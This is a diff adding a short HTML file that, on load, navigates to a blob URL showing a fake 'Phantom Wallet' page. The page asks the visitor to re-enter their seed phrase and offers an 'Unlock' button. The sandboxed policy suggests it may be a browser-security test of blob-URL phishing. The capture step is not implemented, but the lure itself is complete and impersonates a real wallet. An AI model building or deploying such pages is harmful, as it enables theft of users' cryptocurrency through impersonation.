@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="Content-Security-Policy" content="sandbox allow-scripts">
+  <title>Phantom</title>
+  <script>
+    const fakePage = `
+      <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        input { padding: 10px; margin: 5px; width: 80%; }
+        button { padding: 10px; width: 85%; }
+      </style>
+      <h2>Phantom Wallet</h2>
+      <p>Please re-enter your credentials</p>
+      <input placeholder="Seed Phrase" />
+      <br>
+      <button>Unlock</button>
+    `;
+    const blob = new Blob([fakePage], { type: "text/html" });
+    const url = URL.createObjectURL(blob);
+    location.href = url;
+  </script>
+</head>
+<body></body>
+</html>
